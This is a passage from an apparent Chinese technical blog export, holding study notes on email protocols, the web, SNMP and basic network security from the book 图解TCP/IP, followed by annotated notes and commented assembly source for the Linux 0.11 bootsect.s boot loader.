Exchange）记录中指定了mailserver.kusa.ac.jp。于是任何==发给以kusa.ac.jp结尾的地址的邮件都将被发送到mailserver.kusa.ac.jp服务器==。就这样，根据MX记录中指定的邮件服务器，可以管理不同邮件地址与特定邮件服务器之间的映射关系。\nMIME 很长一段时间里，互联网中的电子邮件只能处理文本格式的（由文字组成的信息。过去的电子邮件，就日本来说人们只能发送7比特 JIS编码的信息。） 邮件。不过现在，电子邮件所能发送的数据类型已被扩展到==MIME（Multipurpose Internet Mail Extensions，通用互联网邮件扩充==，广泛用于互联网并极大地扩展了数据格式，还可以用于WWW和NetNews中） ，可以发送静态图像、动画、声音、程序等各种形式的数据。鉴于MIME规定了应用消息的格式，因此==在OSI参考模型中它相当于第6层表示层==。\nSMTP SMTP是发送电子邮件的协议。它使用的是TCP的25号端口。SMTP建立一个TCP连接以后，在这个连接上进行控制和应答以及数据的发送。客户端以文本的形式发出请求，服务端返回一个3位数字的应答。\nPOP 前一节提到的SMTP是发送邮件的协议，即，==SMTP是想要发送邮件的计算机向接收邮件的计算机发送电子邮件的一种协议==。在以UNIX工作站为主的互联网初期，这种机制没有什么问题，但是后来用个人电脑连接互联网的环境中就出现很多不便之处。\n个人电脑不可能长时间处于开机状态。只有用户在使用时才会开机。在这种情况下，人们希望一开机就能接收到邮件。然而SMTP没有这种处理机制。==SMTP的一个不利之处就在于它支持的是发送端主机的行为，而不是根据接收端的请求发送邮件==。\n为了解决这个问题，就引入了POP协议。如图8.14所示，该协议是==一种用于接收电子邮件的协议==。==发送端的邮件根据SMTP协议将被转发给一直处于插电状态的POP服务器。客户端再根据POP协议从POP服务器接收对方发来的邮件。==在这个过程中，为了防止他人盗窃邮件内容，还要进行用户验证。\nIMAP IMAP（Internet Message Access Protocol） 与POP类似，也是接收电子邮件的协议。==在POP中邮件由客户端进行管理，而在IMAP中邮件则由服务器进行管理==。使用IMAP时，可以不必从服务器上下载所有的邮件也可以阅读。由于IMAP是在服务器端处理MIME信息，所以它可以实现当某一封邮件含有10个附件时“只下载其中的第7个附件”的功能（在POP中无法下载某个特定的附件。因此想要确认附件时就不得不下载邮件中所有的附件） 。\n有了IMAP人们就可以通过个人电脑、公司的电脑、笔记本电脑以及智能手机等连接到IMAP服务器以后进行收发邮件。由此，在公司下载的电子邮件就不必在笔记本电脑和智能手机上转来转去（不过笔记本电脑和智能手机必须能够连上IMAP服务器才行） 。IMAP确实为使用多种异构终端的人们提供了非常便利的环境。\n4.WWW ==万维网（WWW，World Wide Web）==是将互联网中的信息以超文本（超文本用以显示文本及与文本相关的内容） 形式展现的系统。也叫做Web。可以显示WWW信息的客户端软件叫做Web浏览器（Web浏览器（Web Browser），有时也简称为浏览器） 。\nWWW定义了3个重要的概念，它们分别是访问信息的手段与位置==（URI，Uniform Resource Identifier）==、信息的表现形式==（HTML， HyperText Markup Language）==以及信息转发==（HTTP，HyperText Transfer Protocol）==等操作。\nURI URI是==Uniform Resource Identifier==的缩写，用于标识资源。URI是一种可以用于WWW之外的高效的识别码，它被用于主页地址（也被叫做URL（Uniform Resource Locator））、电子邮件、电话号码等各种组合中。\n==URI所表示的组合叫方案（Scheme）==\n在众多URI的Scheme中WWW主要用其中的==http和https表示Web页的位置和访问Web页的方法==。\nURI的http方案的具体格式如下：\nhttp://主机名/路径\nhttp://主机名：端口号/路径\nhttp://主机名：端口号/路径？访问内容#部分信息\nHTML HTMP是记述Web页的一种语言（数据格式）。它可以指定浏览器中显示的文字、文字的大小和颜色。此外，不仅可以对图像或动画进行相关设置，还可以设置音频内容。\n如果把它对应到OSI参考模型，那么可以认为HTML属于WWW的==表示层==（HTML不仅用于WWW，有时还用于电子邮件）\nHTTP 当用户在浏览器的地址栏里输入所要访问Web页的URI以后，HTTP的处理即会开始。HTTP中默认使用80端口。它的工作机制，首先是客户端向服务器的80端口建立一个TCP连接，然后在这个TCP连接上进行请求和应答以及数据报文的发送。\nJavaScript、CGI、Cookie 5.网络管理 SNMP SNMP中管理端叫做管理器（Manager，网络监控终端），被管理端叫做代理（路由器、交换机等）（SNMPv3中管理器和代理都叫做实体 （Entity）） 。决定管理器与代理之间的通信中所要交互信息的正是SNMP。SNMP中如果将MIB（==SNMP中交互的信息是MIB（Management Information Base）==。MIB是在树形结构的数据库中为每个项目附加编号的一种信息结构） 看做代理所管理的信息在数据库中的值，那么它可以新增一个值。\n第9章 网络安全 1.网络安全构成要素 防火墙 IDS（入侵检测系统） 反病毒/个人防火墙 2.加密技术基础 为了防止信息的泄露、实现机密数据的传输，出现了各种各样的加密技术。加密技术分布与OSI参考模型的各个阶层一样，相互协同保证通信。\n对称密码体制与公钥密码体制 加密是指利用某个值（密钥）对明文的数据通过一定的算法变换成加密（密文）数据的过程。它的逆反过程叫做解密。\n==加密和解密使用相同的密钥叫做对称加密方式。反之，如果在加密和解密过程中分别使用不同的密钥（公钥和私钥）则叫做公钥加密方式。==\n对称加密方式包括AES（Advanced Encryption Standard）、 DES（Data Encryption Standard）等加密标准，而公钥加密方法中包括RSA、DH（Diffie-Hellman）、椭圆曲线等加密算法。\n身份认证技术 3.安全协议 IPsec与VPN 以前，为了防止信息泄露，对机密数据的传输一般不使用互联网等公共网络（Public Network），而是使用由专线连接的私有网络（Private Network）。从而在物理上杜绝了窃听和篡改数据的可能。然而，专线的造价太高是一个不可回避的问题。\n为了解决此类问题，人们想出了在互联网上构造一个==虚拟的私有网络==。即VPN（Virtual Private Network，虚拟专用网） 。互联网中采用加密和认证技术可以达到“即使读取到数据也无法读懂”、“检查是否被篡改”等功效。VPN正是一种利用这两种技术打造的网络。\n在构建VPN时，最常被使用的是==IPsec==。它是指在IP首部的后面追加==“封装安全有效载荷”（ESP，Encapsulating Security Payload。）和“认证首部”（AH，Authentication Header。）== ，从而对此后的数据进行加密，不被盗取者轻易解读。\n==在发包的时候附加上述两个首部==，可以在收包时根据首部对数据进行解密，恢复成原始数据。由此，加密后的数据不再被轻易破解，即使在途中被篡改，也能够被及时检测。\n基于这些功能，VPN的使用者就可以不必设防地使用一个安全的网络环境。\nTLS/SSL与HTTPS Web中可以通过TLS/SSL（Transport Layer Security/Secure Sockets Layer。由网景公司最早提出的名称叫SSL，标准化以后被称作TLS。有时两者统称为SSL） 对HTTP通信进行加密。==使用TLS/SSL的HTTP通信叫做HTTPS通信==。==HTTPS中采用对称加密方式。而在发送其公共密钥时采用的则是公钥加密方式==（对称加密虽然速度快，但是密钥管理是巨大的挑战。公钥加密密钥管理相对简单，但是处理速度非常慢。TLS/SSL将两者进行取长补短令加密过程达到了极好的效果。由于谁都可以发送公钥，使得密钥管理更为简单） 。\n确认公钥是否正确主要使用认证中心（CA（Certificate Authority） ）签发的证书，而主要的认证中心的信息已经嵌入到浏览器的出厂设置中。如果Web浏览器中尚未加入某个认证中心，那么会在页面上提示一个警告信息。此时，判断认证中心合法与否就要由用户自己决定了。\nIEEE802.1X IEEE802.1X是==为了能够接入LAN交换机和无线LAN接入点而对用户进行认证的技术==。并且它只允许被认可的设备才能访问网络。虽然它是一个提供数据链路层控制的规范，但是与TCP/IP关系紧密。一般，由客户端终端、AP（无线基站）或2层交换机以及认证服务器组成。\n","permalink":"https://chance7bin.github.io/posts/basic/network/%E5%9B%BE%E8%A7%A3tcpip/","summary":"写在前面 该篇博客是我在看《图解TCPIP》这本书时记录的学习笔记✍~~ 第1章 网络基础知识 计算机网络，根据其规模可分为==WAN（Wide Area N","title":"图解TCPIP"},{"content":"引导启动程序\u0026mdash;bootsect 1.简介 冯·诺依曼存储程序思想\n存储程序的主要思想：将程序和数据存放到计算机内部的存储器中，计算机在程序的控制下一步一步进行处理\n计算机由五大部件组成：输入设备、输出设备、存储器、运算器、控制器\n==取指执行（取指、{间指}、执行、{中断} 大括号可选 ）==\n打开电源，计算机执行的第一句指令什么? 指针IP及其指向的内容\n对于X86PC机而言： (1)x86 PC刚开机时CPU处于实模式 (2)开机时，CS=0xFFFF; IP=0x0000 (3)寻址0xFFFF0(ROM BIOS映射区) (4)检查RAM，键盘，显示器，软硬磁盘 (5)将磁盘0磁道0扇区读入0x7c00处 (6)设置cs=0x07c0，ip=0x0000\n注：实模式和保护模式对应，实模式的寻址CS:IP(CS左移4位+IP)， 和保护模式(32位汇编模式下)不一\n0x7c00处存放的代码：从磁盘引导扇区读入的512个字节\n1.引导扇区就是==启动设备的第一个扇区==（开机时按住del键可进入启动设备设置界面，可 以设置为光盘启动!）\n2.启动设备信息被设置在CMOS中（CMOS: (64B-128B)。用来存储实时钟和硬件配置信息。）\n因此，硬盘的第一个扇区上存放着开机后执行的第一段我们可以控制的程序\n==操作系统的故事从这里开始\u0026hellip;==\n2.操作系统启动流程 bootsect.s和setup.s是实时模式下运行的16位代码程序，采用近似Intel语法，而head.s使用GUN汇编格式(AT\u0026amp;T),并且运行到保护模式下。\n当PC的电源打开后，CPU自动进入实模式，并从地址0XFFFF0开始执行程序代码，这个地址通常是ROM-BIOS中的地址，PC机的BIOS将执行某些系统检测，并在物理地址0处开始初始化中断向量。然后，它将可以启动设备的第一个扇区(磁盘引导扇区，512byte)读入内存绝对地址0x7C00处，并跳转到这个地方，启动设备通常是软驱或者硬盘。\nLinux最前面部分(boot/bootsect.s)，它将由BIOS读入内存绝对地址0x7C00处，当它被执行时就会把自己移动到内存绝对地址0X90000处，并把启动设备中后2kb字节代码(boot/setup.s)读入到内存0x90200处，而内核的其他部分(system模块）则被读入到内存地址0x10000开始处\nsetup.s将会把system模块移动到物理内存起始位置处，这样system模块中代码的地址就等于实际的物理地址，便于对内核代码和数据操作。\n从机器加电开始执行顺序 启动引导时内核在内存中的位置和移动： 整个系统从地址0x10000移至0x0000处，进入保护模式并跳转至系统的余下部分(在0x0000chu)。此时所有的32位运行方式的设置启动被完成：IDT,GDT和LDT被加载，处理器和协处理器也确认，分页工作也设置完成。\n最终调用init/main.c中main()程序\n3.引导扇区代码: bootsect.s bootsect.s代码是磁盘引导块程序，驻留在磁盘的第一个扇区中（引导扇区，0磁道（柱面），0磁头，第一个扇区）\n在PC机加电ROM BIOS自检后，ROM BIOS会把引导扇区代码bootsect加载到内存地址0x7C00开始处并执行之。在bootsect代码执行期间，它会将自己移动到内存绝对地址0x90000开始处并继续执行。\n该程序的主要作用是首先把从磁盘第2个扇区开始的4个扇区的setup模块(由 setup.s编译而成)加载到内存紧接着bootsect后面位置处(0x90200),然后利用BIOS中断 0x13 ，取磁盘参数表中当前启动引导盘的参数，接着在屏幕上显示“Loading system.”字符串。\n再把磁盘上setup模块后面的system模块加载到内存0x10000开始的地方。随后确定根文件系统的设备号，若没有指定，则根据所保存的引导盘的每磁道扇区数判别出盘的类型和种类并保存其设备号于 root_dev( 引导块的508地址处)，最后长跳转到setup程序的开始处(0x00200)执行setup程序。\n各源文件位置 1.由BIOS读入内存绝对地址0x7C00处，当它被执行时就会把自己移动到内存绝对地址0X90000处\nds:si\nes:di\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ; bootsect启动程序将它自身从内容0x07c00(BOOTSEG)处复制至内存0x9000(INITSEG)处 entry start ;关键字entry告诉链接器\u0026#34;程序入口\u0026#34; start: mov\tax,#BOOTSEG ;BOOTSEG = 0x07c0 赋值给ax， mov\tds,ax ;源地址 mov\tax,#INITSEG ;INITSEG = 0x9000 赋值给bx mov\tes,ax\t;目标地址 mov\tcx,#256 ;循环次数，每次循环完次数减一 sub\tsi,si ;清零 sub\tdi,di ;清零 rep\t;rep是repeat，rep配合 movw(movsb) 就是多次复制直到cx=0为止 复制的次数放在cx中 movw ;用于把内容从ds:si 复制es:di 以字位单位 jmpi\tgo,INITSEG ;间接跳转 即程序跳到9000:0 去继续执行 CS=INITSEG，IP=go(偏移地址) ; 从这里开始cpu已经跳到内存0x90000去执行， ; BIOS把引导扇区加载到0x7c00处并把执行权交给引导程序，(ss=0x00,sp=0xfffe) ; 将ds,es,ss,都设置成移动后代码所在段(0x9000) go:\tmov\tax,cs ;ax = cs = INITSEG = 0x9000 mov\tds,ax ;数据段地址 mov\tes,ax ;附加段地址 ! put stack at 0x9ff00. ;将堆栈指针sp指向0x9fff00(0x9000:0xff00) mov\tss,ax ;栈段地址 ; 保证栈指针sp只要指向远大于512byte字节偏移(即地址0x90200) ; 因为在0x90200后要存放setup程序，大约为4个扇区 sp指向大于(0x200+0x200*4+堆栈大小) mov\tsp,#0xFF00\t! arbitrary value \u0026gt;\u0026gt;512 ! load the setup-sectors directly after the bootblock. ; 在bootsect程序紧跟着加载setup程序 ! Note that \u0026#39;es\u0026#39; is already set up. ; es在移动代码时设置好了指向目的地址0x9000 2.利用BIOS中断 INT 0x13 将setup模块从磁盘第2个扇区开始读到0x90200,然后取磁盘参数表中当前启动引导盘的参数，接着在屏幕上显示“Loading system.”字符串\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 ; 这一段主要是利用BIOS中断 INT 0x13 将setup模块从磁盘第2个扇区开始读到0x90200, ; 一个四个扇区，如果读错，则复位驱动器，并重试 ; INT 0x13 使用方法： ; 读扇区： ; ah = 0x02 --读磁盘扇区到内存 ; al = 需要读出的扇区数量 ; ch = 磁道(柱面)号低8位 ; cl = 开始扇区(位0-5)，磁道号高两位(位6-7) ; dh = 磁头号 ; dl = 驱动器号(如果是硬盘则位7要置位) ; es:bx--\u0026gt;指向数据缓存区 ，如果出错则CF标志置位，ah中是出错码 load_setup: mov\tdx,#0x0000\t! drive 0, head 0 mov\tcx,#0x0002\t! sector 2, track 0 mov\tbx,#0x0200\t! address = 512, in INITSEG mov\tax,#0x0200+SETUPLEN\t! service 2, nr of sectors int\t0x13\t! read it ; JNC:Jump Not Carry 没进位时跳转 正确读取时CF=0 jnc\tok_load_setup\t! ok - continue ; 读取出错，对驱动器0进行读操作 并重新读取加载setup程序 mov\tdx,#0x0000 mov\tax,#0x0000\t! reset the diskette int\t0x13 j\tload_setup ! jmp指令 返回到重新加载setup处 ok_load_setup: ! Get disk drive parameters, specifically nr of sectors/track ; 取磁盘驱动器的参数，特别是每道的扇区数量 ; 取磁盘驱动器的参数 INT 0x13调用格式和返回信息： ; 调用格式: ; ah = 0x08 dl = 驱动器号(如果是硬盘则位7要置位) ; 返回信息： ; 如果出错，则CF值位，并且ah = 状态码 ; ah = 0, al = 0 bl = 驱动器类型(AT/PS2) ; ch = 磁道(柱面)号低8位 ; cl = 开始扇区(位0-5)，磁道号高两位(位6-7)\t; dh = 最大磁头数 ， dl = 驱动器数量 ; es:di---\u0026gt;软驱磁盘参数表 mov\tdl,#0x00 mov\tax,#0x0800\t! AH=8 is get drive parameters int\t0x13 mov\tch,#0x00 ; 这条指令表示下一条指令的操作数在cs段寄存器所指的段中 seg cs ; 保持每磁道扇区数 (cx = 每磁道扇区数) mov\tsectors,cx mov\tax,#INITSEG ; 由于上面取磁道参数中断改掉了es的值，这里重新复制， mov\tes,ax ! Print some inane message ; 显示信息：\u0026#34;\u0026#39;Loading system ...\u0026#39;回车换行\u0026#34; 包括回车换行一共24个字符 ; BIOS中断0x10功能号 ah= 0x03,读光标的位置 ; 输入:bh = 页号 ; 返回：ch = 扫描开始线，cl = 结束开始线,dh = 行号(0x00顶端)，dl=列号(0x00最左边) ！ ; BIOS中断0x10功能号 ah= 0x13,显示字符串 ; 输入：al=放置光标的方式及规定属性，0x01--表示使用bl中的属性，光标停在字符串结尾处 ; es:bp 此寄存器指向要显示字符串起始位置处 ; cx = 显示的字符串字符数 ; bh = 显示页面号 bl = 字符属性 dh = 行号，dl=列号 mov\tah,#0x03\t! read cursor pos xor\tbh,bh ! 首先读光标的位置，返回光标位置值在dx int\t0x10 ！dh = 行(0-23) dl = 列(0-79) 显示字符串使用 mov\tcx,#24 ! 显示24个字符 mov\tbx,#0x0007\t! page 0, attribute 7 (normal) mov\tbp,#msg1\t! es:bp 寄存器指向要显示字符串起始位置处 mov\tax,#0x1301\t! write string, move cursor int\t0x10 ! ok, we\u0026#39;ve written the message, now ! we want to load the system (at 0x10000) ; 将system加载到0x10000 mov\tax,#SYSSEG mov\tes,ax\t! segment of 0x010000 call\tread_it ; 读磁盘上system模块，es为输入参数 call\tkill_motor ; 关闭驱动器马达，这样就可以知道驱动器的状态 3.检测使用的根文件系统\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ; 检测使用的根文件系统 ; 如果已经指定了设备并且不等于0，就直接使用给定的设备，否则就需要报道的每磁道扇区数来 ; 确定是使用/dev/PS0(2,28) 还是/dev/at0(2,8) ; 在Linux中软驱的主设备是2，次设备 = type*4 + nr ; type是软驱的类型(2--\u0026gt;1.2MB,7--\u0026gt;1,44MB) ; nr(0-3)对应软驱A,B,C,D ; /dev/PS0(2,28)---\u0026gt;1.44mb A驱动器，设备号0x21c 7*4+0 =28 ; /dev/at0(2,8)---\u0026gt;1.2MB A驱动器，设备号0x0208 seg cs mov\tax,root_dev ！取508，509 byte处的根设备号,root_dev定义在这里 cmp\tax,#0 jne\troot_defined ！判断是否被定义，每定义跳到定义处 seg cs mov\tbx,sectors mov\tax,#0x0208\t! /dev/ps0 - 1.2Mb cmp\tbx,#15\t! 判断每磁道扇区数是否等于15 ，sectors等于15则是1.2Mb驱动器 je\troot_defined mov\tax,#0x021c\t! /dev/PS0 - 1.44Mb cmp\tbx,#18 ! sectors等于18则是1.44Mb驱动器 je\troot_defined ; 如果都不一样，则死循环(死机) undef_root: jmp undef_root root_defined: seg cs mov\troot_dev,ax ！将检测到的设备号保存到root_dev ! after that (everyting loaded), we jump to ! the setup-routine loaded directly after ! the bootblock: ; 到这里，所有的程序都加载完毕，然后跳转到加载到bootsect后面的setup程序 jmpi\t0,SETUPSEG ！！！！！！本程序结束 4.剩余的程序两个子程序，(read_it)用于读取system模块，(kill_moter)用于关闭软件的马达，就不一一介绍了。\n4.完整的bootsect.s源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 ! ! SYS_SIZE is the number of clicks (16 bytes) to be loaded. ! 0x3000 is 0x30000 bytes = 196kB, more than enough for current ! versions of linux SYSSIZE = 0x3000 ;SYS_SIZE是要加载的系统模块长度，单位是节，16 bytes为1节 ;0x3000字节 = 196kB ! ;操作系统启动流程 !\tbootsect.s\t(C) 1991 Linus Torvalds ! ! bootsect.s is loaded at 0x7c00 by the bios-startup routines, and moves ! iself out of the way to address 0x90000, and jumps there. ! ! It then loads \u0026#39;setup\u0026#39; directly after itself (0x90200), and the system ! at 0x10000, using BIOS interrupts. ! ! NOTE! currently system is at most 8*65536 bytes long. This should be no ! problem, even in the future. I want to keep it simple. This 512 kB ! kernel size should be enough, especially as this doesn\u0026#39;t contain the ! buffer cache as in minix ! ! The loader has been made as simple as possible, and continuos ! read errors will result in a unbreakable loop. Reboot by hand. It ! loads pretty fast by getting whole sectors at a time whenever possible. ;伪指令， .globl用于定义随后的标识符是外部或者全局的 .globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符，供ld86链使用 .text ！正文段 begtext: ！标号 代表其所在的位置，通常指明一个跳转命令的目标地址 .data ！数据段 begdata: .bss ！未初始化数据段 begbss: .text ！正文段 SETUPLEN = 4\t! nr of setup-sectors ！setup程序的扇区数值 BOOTSEG = 0x07c0\t! original address of boot-sector ！BIOS加载bootsect代码的原始段地址 INITSEG = 0x9000\t! we move boot here - out of the way ！将bootsect移动到这里 SETUPSEG = 0x9020\t! setup starts here ！setup程序从这里开始 SYSSEG = 0x1000\t! system loaded at 0x10000 (65536). ！system模块加载到0x010000(64kb). ENDSEG = SYSSEG + SYSSIZE\t! where to stop loading ! 停止加载的段地址 ! ROOT_DEV:\t0x000 - same type of floppy as boot. ; 根文件系统设备使用与引导时相同的软驱设备 !\t0x301 - first partition on first drive etc ; 根文件系统设备在第一个硬盘的第一个分区上 ROOT_DEV = 0x306 ; 设备号0x36指定根文件系统时第2个硬盘的第一个分区 ; 设备号命名方式： ; 设备号 = 主设备号*256 + 次设备号 (dev_no = (major\u0026lt;\u0026lt;8)+minor) ; 主设备号：1-内存，2-磁盘，3-硬盘，4-ttyx,5-tty,6-并行口，7-非命名管道 ; 0x300 - /dev/hd0 --代表整个第一个硬盘 ; 0x30(1-4) - /dev/hd(1-4) --代表第一个盘的1-4个分区 ; 0x305 - /dev/hd5 --代表整个第二个硬盘 ; 0x30(6-9) - /dev/hd(6-9) --代表第二个盘的1-4个分区 ; bootsect启动程序将它自身从内容0x07c00(BOOTSEG)处复制至内存0x9000(INITSEG)处 entry start ;关键字entry告诉链接器\u0026#34;程序入口\u0026#34; start: mov\tax,#BOOTSEG ;BOOTSEG = 0x07c0 赋值给ax， mov\tds,ax ;源地址 mov\tax,#INITSEG ;INITSEG = 0x9000 赋值给bx mov\tes,ax\t;目标地址 mov\tcx,#256 ;循环次数，每次循环完次数减一 sub\tsi,si ;清零 sub\tdi,di ;清零 rep\t;rep是repeat，rep配合 movw(movsb) 就是多次复制直到cx=0为止 复制的次数放在cx中 movw ;用于把内容从ds:si 复制es:di 以字位单位 jmpi\tgo,INITSEG ;间接跳转 即程序跳到9000:0 去继续执行 CS=INITSEG，IP=go(偏移地址) ; 从这里开始cpu已经跳到内存0x90000去执行， ; BIOS把引导扇区加载到0x7c00处并把执行权交给引导程序，(ss=0x00,sp=0xfffe) ; 将ds,es,ss,都设置成移动后代码所在段(0x9000) go:\tmov\tax,cs ;ax = cs = INITSEG = 0x9000 mov\tds,ax ;数据段地址 mov\tes,ax ;附加段地址 ! put stack at 0x9ff00. ;将堆栈指针sp指向0x9fff00(0x9000:0xff00) mov\tss,ax ;栈段地址 ; 保证栈指针sp只要指向远大于512byte字节偏移(即地址0x90200) ; 因为在0x90200后要存放setup程序，大约为4个扇区 sp指向大于(0x200+0x200*4+堆栈大小) mov\tsp,#0xFF00\t! arbitrary value \u0026gt;\u0026gt;512 ! load the setup-sectors directly after the bootblock. ; 在bootsect程序紧跟着加载setup程序 ! Note that \u0026#39;es\u0026#39; is already set up. ; es在移动代码时设置好了指向目的地址0x9000 ; 这一段主要是利用BIOS中断 INT 0x13 将setup模块从磁盘第2个扇区开始读到0x90200, ; 一个四个扇区，如果读错，则复位驱动器，并重试 ; INT 0x13 使用方法： ; 读扇区： ; ah = 0x02 --读磁盘扇区到内存 ; al = 需要读出的扇区数量 ; ch = 磁道(柱面)号低8位 ; cl = 开始扇区(位0-5)，磁道号高两位(位6-7) ; dh = 磁头号 ; dl = 驱动器号(如果是硬盘则位7要置位) ; es:bx--\u0026gt;指向数据缓存区 ，如果出错则CF标志置位，ah中是出错码 load_setup: mov\tdx,#0x0000\t! drive 0, head 0 mov\tcx,#0x0002\t! sector 2, track 0 mov\tbx,#0x0200\t! address = 512, in INITSEG mov\tax,#0x0200+SETUPLEN\t! service 2, nr of sectors int\t0x13\t! read it ; JNC:Jump Not Carry 没进位时跳转 正确读取时CF=0 jnc\tok_load_setup\t! ok - continue ; 读取出错，对驱动器0进行读操作 并重新读取加载setup程序 mov\tdx,#0x0000 mov\tax,#0x0000\t! reset the diskette int\t0x13 j\tload_setup ! jmp指令 返回到重新加载setup处 ok_load_setup: ! Get disk drive parameters, specifically nr of sectors/track ; 取磁盘驱动器的参数，特别是每道的扇区数量 ; 取磁盘驱动器的参数 INT 0x13调用格式和返回信息： ; 调用格式: ; ah = 0x08 dl = 驱动器号(如果是硬盘则位7要置位) ; 返回信息： ; 如果出错，则CF值位，并且ah = 状态码 ; ah = 0, al = 0 bl = 驱动器类型(AT/PS2) ; ch = 磁道(柱面)号低8位 ; cl = 开始扇区(位0-5)，磁道号高两位(位6-7)\t; dh = 最大磁头数 ， dl = 驱动器数量 ; es:di---\u0026gt;软驱磁盘参数表 mov\tdl,#0x00 mov\tax,#0x0800\t! AH=8 is get drive parameters int\t0x13 mov\tch,#0x00 ; 这条指令表示下一条指令的操作数在cs段寄存器所指的段中 seg cs ; 保持每磁道扇区数 (cx = 每磁道扇区数) mov\tsectors,cx mov\tax,#INITSEG ; 由于上面取磁道参数中断改掉了es的值，这里重新复制， mov\tes,ax ! Print some inane message ; 显示信息：\u0026#34;\u0026#39;Loading system ...\u0026#39;回车换行\u0026#34; 包括回车换行一共24个字符 ; BIOS中断0x10功能号 ah= 0x03,读光标的位置 ; 输入:bh = 页号 ; 返回：ch = 扫描开始线，cl = 结束开始线,dh = 行号(0x00顶端)，dl=列号(0x00最左边) ！ ; BIOS中断0x10功能号 ah= 0x13,显示字符串 ; 输入：al=放置光标的方式及规定属性，0x01--表示使用bl中的属性，光标停在字符串结尾处 ; es:bp 此寄存器指向要显示字符串起始位置处 ; cx = 显示的字符串字符数 ; bh = 显示页面号 bl = 字符属性 dh = 行号，dl=列号 mov\tah,#0x03\t! read cursor pos xor\tbh,bh ! 首先读光标的位置，返回光标位置值在dx int\t0x10 ！dh = 行(0-23) dl = 列(0-79) 显示字符串使用 mov\tcx,#24 ! 显示24个字符 mov\tbx,#0x0007\t! page 0, attribute 7 (normal) mov\tbp,#msg1\t! es:bp 寄存器指向要显示字符串起始位置处 mov\tax,#0x1301\t! write string, move cursor int\t0x10 ! ok, we\u0026#39;ve written the message, now ! we want to load the system (at 0x10000) ; 将system加载到0x10000 mov\tax,#SYSSEG mov\tes,ax\t! segment of 0x010000 call\tread_it ; 读磁盘上system模块，es为输入参数 call\tkill_motor ; 关闭驱动器马达，这样就可以知道驱动器的状态 ! After that we check which root-device to use. If the device is ! defined (!= 0), nothing is done and the given device is used. ! Otherwise, either /dev/PS0 (2,28) or /dev/at0 (2,8), depending ! on the number of sectors that the BIOS reports currently. ; 检测使用的根文件系统 ; 如果已经指定了设备并且不等于0，就直接使用给定的设备，否则就需要报道的每磁道扇区数来 ; 确定是使用/dev/PS0(2,28) 还是/dev/at0(2,8) ; 在Linux中软驱的主设备是2，次设备 = type*4 + nr ; type是软驱的类型(2--\u0026gt;1.2MB,7--\u0026gt;1,44MB) ; nr(0-3)对应软驱A,B,C,D ; /dev/PS0(2,28)---\u0026gt;1.44mb A驱动器，设备号0x21c 7*4+0 =28 ; /dev/at0(2,8)---\u0026gt;1.2MB A驱动器，设备号0x0208 seg cs mov\tax,root_dev ！取508，509 byte处的根设备号,root_dev定义在这里 cmp\tax,#0 jne\troot_defined ！判断是否被定义，每定义跳到定义处 seg cs mov\tbx,sectors mov\tax,#0x0208\t! /dev/ps0 - 1.2Mb cmp\tbx,#15\t! 判断每磁道扇区数是否等于15 ，sectors等于15则是1.2Mb驱动器 je\troot_defined mov\tax,#0x021c\t! /dev/PS0 - 1.44Mb cmp\tbx,#18 ! sectors等于18则是1.44Mb驱动器 je\troot_defined ; 如果都不一样，则死循环(死机) undef_root: jmp undef_root root_defined: seg cs mov\troot_dev,ax ！将检测到的设备号保存到root_dev ! after that (everyting loaded), we jump to ! the setup-routine loaded directly after ! the bootblock: ; 到这里，所有的程序都加载完毕，然后跳转到加载到bootsect后面的setup程序 jmpi\t0,SETUPSEG ！！！！！！本程序结束 ; 下面是两个子程序，(read_it)用于读取system模块，(kill_moter)用于关闭软件的马达 ! This routine loads the system at address 0x10000, making sure ! no 64kB boundaries are crossed. We try to load it as fast as ! possible, loading whole tracks whenever we can. ! ! in:\tes - starting address segment (normally 0x1000) ! ; 该子程序将系统模块加载到内存地址0x10000处，并确定没有跨越64kb内存边界 ; 尽快可能的加载，每次加载整条磁道的数据 ; 输入：es开始内存地址段值(一般0x1000) ; .word定义一个字内存 ; (1+SETUPLEN)表示开始已经读进一个引导扇区和setup程序所占的扇区数SETUPLEN sread:\t.word 1+SETUPLEN\t! sectors read of current track 当前磁道中已读扇区数 head:\t.word 0\t! current head 当前磁头号 track:\t.word 0\t! current track 当前磁道号 read_it: mov ax,es test ax,#0x0fff die:\tjne die\t! es must be at 64kB boundary xor bx,bx\t! bx is starting address within segment rp_read: mov ax,es cmp ax,#ENDSEG\t! have we loaded all yet? jb ok1_read ret ok1_read: seg cs mov ax,sectors sub ax,sread mov cx,ax shl cx,#9 add cx,bx jnc ok2_read je ok2_read xor ax,ax sub 